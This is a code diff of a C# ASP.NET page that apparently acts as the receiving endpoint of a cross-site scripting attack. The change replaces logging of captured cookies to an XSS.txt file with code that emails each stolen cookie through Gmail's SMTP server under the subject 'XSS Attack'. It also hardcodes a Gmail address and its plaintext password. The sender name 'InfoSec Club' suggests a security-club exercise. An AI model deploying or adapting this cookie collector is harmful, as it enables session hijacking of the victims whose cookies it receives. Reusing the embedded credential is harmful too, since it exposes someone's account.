@@ -4,6 +4,8 @@ using System.Linq;
 using System.Web;
 using System.Web.UI;
 using System.Web.UI.WebControls;
+using System.Net;
+using System.Net.Mail;
 
 using System.Text;
 using System.IO;
@@ -23,16 +25,30 @@ namespace WebApplication5
             {
                   cookie = Request.QueryString.ToString();
             }
-            StringBuilder newFile = new StringBuilder();
-
-            String documentURL = Request.QueryString["url"];
-            string[] file = File.ReadAllLines(@"C:\Users\Todd\Desktop\XSS.txt");
-            foreach (string line in file)
+             var fromAddress = new MailAddress("vivi.langga@gmail.com", "InfoSec Club");
+            var toAddress = new MailAddress("vivi.langga@gmail.com","Vivi Langga");
+            const string fromPassword = "sushi3231";
+            const string subject = "XSS Attack";
+            string body = "The cookie is: " +cookie;
+            var smtp = new SmtpClient
             {
-                newFile.Append(line + "\r\n");
+                Host = "smtp.gmail.com",
+                Port = 587,
+                EnableSsl = true,
+                DeliveryMethod = SmtpDeliveryMethod.Network,
+                UseDefaultCredentials = false,
+                Credentials = new NetworkCredential(fromAddress.Address, fromPassword)
+            };
+            using (var message = new MailMessage(fromAddress, toAddress)
+            {
+                Subject = subject,
+                Body = body
+            })
+            {
+                smtp.Send(message);
             }
-            newFile.Append(documentURL +": " +cookie);
-            File.WriteAllText(@"C:\Users\Todd\Desktop\XSS.txt", newFile.ToString());
+
+       
 
         }
     }
